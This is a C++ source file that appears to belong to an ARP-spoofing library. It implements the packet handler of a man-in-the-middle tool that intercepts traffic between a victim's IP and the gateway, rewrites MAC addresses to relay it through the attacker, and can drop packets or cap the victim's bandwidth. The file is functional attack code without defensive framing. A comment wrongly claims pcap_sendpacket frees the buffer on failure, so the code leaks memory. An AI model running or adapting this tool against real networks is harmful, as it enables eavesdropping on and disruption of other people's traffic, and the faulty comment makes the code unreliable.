#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

char pkt_handler_buf[128];
char forwarding_t_buf[128];

PacketHandler::PacketHandler(pcap_t *adapter, u_char self_mac[6],
                             u_char target_mac[6], u_char gateway_mac[6],
                             u_char target_ip[4], output_queue &output_q)
        : m_adapter(adapter), m_to_stop(false),
          m_to_stop_forwarding(false), m_will_drop_pkt(false),
          m_rate_limit_kBps(INT32_MAX), m_output_queue(output_q) {
    std::copy(target_ip, target_ip + 4, m_target_ip);
    std::copy(self_mac, self_mac + 6, m_self_mac);
    std::copy(gateway_mac, gateway_mac + 6, m_gateway_mac);
    std::copy(target_mac, target_mac + 6, m_target_mac);
}

void PacketHandler::packet_handler_f(u_char *param,
                                     const struct pcap_pkthdr *header,
                                     const u_char *pkt_data) {
    // Parse user parameters
    auto *_this = (PacketHandler *) param;
    bool *will_drop_pkt = std::addressof(_this->m_will_drop_pkt);
    bool *to_stop = std::addressof(_this->m_to_stop);
    pcap_t *adapter = _this->m_adapter;
    u_char *self_mac = _this->m_self_mac;
    u_char *gateway_mac = _this->m_gateway_mac;
    u_char *target_mac = _this->m_target_mac;
    u_char *target_ip = _this->m_target_ip;
    pkt_queue &forwarded_pkt_queue = _this->m_forwarded_pkt_queue;
    output_queue &output_q = _this->m_output_queue;
    unsigned long *rate_limit_kBps = std::addressof(_this->m_rate_limit_kBps);


    // Parse packet data
    auto *eh = (ethernet_header *) pkt_data;
    auto *ih = (ip_header *) (pkt_data + sizeof(ethernet_header));

    if (*to_stop) {
        pcap_breakloop(adapter);
    }

    // If packet is sent from gateway to target
    if (equal(ih->destination_addr, ih->destination_addr + 4,
              target_ip)) {
        sprintf(pkt_handler_buf, "To   Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
                EXPAND_IP(ih->source_addr),
                EXPAND_IP(target_ip),
                header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            strcat(pkt_handler_buf, " | From Gateway");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, target_mac))
            strcat(pkt_handler_buf, " | Forwarding  ");


        if (!(*will_drop_pkt)) {
            if (ByteCounter::get_counter() < *rate_limit_kBps) {
                std::copy(self_mac, self_mac + 6, eh->src_mac);
                std::copy(target_mac, target_mac + 6, eh->dst_mac);

                _to_farward_pkt pkt;
                pkt.len = header->len;
                pkt.packet_ptr = new u_char[header->len];
                std::copy(pkt_data, pkt_data + header->len, pkt.packet_ptr);
                forwarded_pkt_queue.push_back(pkt);

                ByteCounter::counter_add(header->len);

                strcat(pkt_handler_buf, " | Forwarding");
            } else {
                sprintf(pkt_handler_buf + strlen(pkt_handler_buf),
                        " | Exceeded %ld kBps", (*rate_limit_kBps) / 1024);
            }
        } else
            strcat(pkt_handler_buf, " | Dropped");
        strcat(pkt_handler_buf, "\n");
    }

    // If packet is sent from target to gateway
    if (equal(ih->source_addr, ih->source_addr + 4,
              target_ip)) {
        sprintf(pkt_handler_buf, "From Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
                EXPAND_IP(target_ip),
                EXPAND_IP(ih->destination_addr),
                header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            strcat(pkt_handler_buf, " | From Target ");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, gateway_mac))
            strcat(pkt_handler_buf, " | Forwarding  ");

        if (!(*will_drop_pkt)) {
            if (ByteCounter::get_counter() < *rate_limit_kBps) {
                std::copy(self_mac, self_mac + 6, eh->src_mac);
                std::copy(gateway_mac, gateway_mac + 6, eh->dst_mac);

                _to_farward_pkt pkt;
                pkt.len = header->len;
                pkt.packet_ptr = new u_char[header->len];
                std::copy(pkt_data, pkt_data + header->len, pkt.packet_ptr);
                forwarded_pkt_queue.push_back(pkt);

                ByteCounter::counter_add(header->len);

                strcat(pkt_handler_buf, " | Forwarding");
            } else {
                sprintf(pkt_handler_buf + strlen(pkt_handler_buf),
                        " | Exceeded %ld kBps", (*rate_limit_kBps) / 1024);
            }
        } else
            strcat(pkt_handler_buf, " | Dropped");
        strcat(pkt_handler_buf, "\n");
    }
    output_q.push_back(string(pkt_handler_buf));
}

void PacketHandler::start() {
    stop();

    ByteCounter::start_counter();
    start_forwarding_thread();

    auto pcap_loop_lambda_f = [this]() {
        pcap_loop(m_adapter, 0,
                  &PacketHandler::packet_handler_f, (u_char *) this);
    };

    m_pcap_loop_t = thread(pcap_loop_lambda_f);
}

void PacketHandler::stop() {
    if (m_pcap_loop_t.joinable()) {
        m_to_stop = true;
        m_pcap_loop_t.join();
    }
    m_to_stop = false;

    stop_forwarding_thread();
    ByteCounter::stop_counter();
}

void PacketHandler::set_drop_packet(bool v) {
    m_will_drop_pkt = v;
}

void PacketHandler::start_forwarding_thread() {
    stop_forwarding_thread();

    auto packet_forwarding_lambda_f = [this]
            (bool &to_stop_forwarding, pkt_queue &pkt_q) {
        int before_seq = concurrent_queue<int>::DEFAULT_SEQ;
        while (!to_stop_forwarding) {

            // check if any new output arrives
            if (before_seq == pkt_q.m_updated_seq) {
                std::this_thread::yield();
                continue;
            }

            // get all new outputs
            before_seq = pkt_q.m_updated_seq;
            queue<_to_farward_pkt> ret_q = pkt_q.pop_all();
            while (!ret_q.empty()) {
                _to_farward_pkt pkt = ret_q.front();
                ret_q.pop();
                auto len = pkt.len;

                if (pcap_sendpacket(m_adapter,
                                    (const u_char *) pkt.packet_ptr,
                                    pkt.len
                ) < 0) {
                    sprintf(forwarding_t_buf, "[packet_handler_f] pkt.len: %-4d | Forwarding Error: ", len);
                    strcat(forwarding_t_buf, pcap_geterr(m_adapter));
                    m_output_queue.push_back(string(forwarding_t_buf));
                } else {
                    // delete is written here in 'else' branch because
                    //  'pcap_sendpacket' must have freed the 'pkt_ptr' once when
                    //  it failed to send the packet!
                    // if we still free 'pkt_ptr' when 'pcap_sendpacket' fails,
                    //  double free will be caused.
                    delete[] pkt.packet_ptr;
                }
            }
        }
    };

    m_pcap_forwarding_t = thread(packet_forwarding_lambda_f,
                                 std::ref(m_to_stop_forwarding),
                                 std::ref(m_forwarded_pkt_queue));
}

void PacketHandler::stop_forwarding_thread() {
    if (m_pcap_forwarding_t.joinable()) {
        m_to_stop_forwarding = true;
        m_pcap_forwarding_t.join();
    }
    m_to_stop_forwarding = false;
}

void PacketHandler::set_rate_limit_kBps(u_long v) {
    m_rate_limit_kBps = v * 1024;
}

const unsigned long &PacketHandler::get_rate_cref() const {
    return std::cref(m_rate_limit_kBps);
}

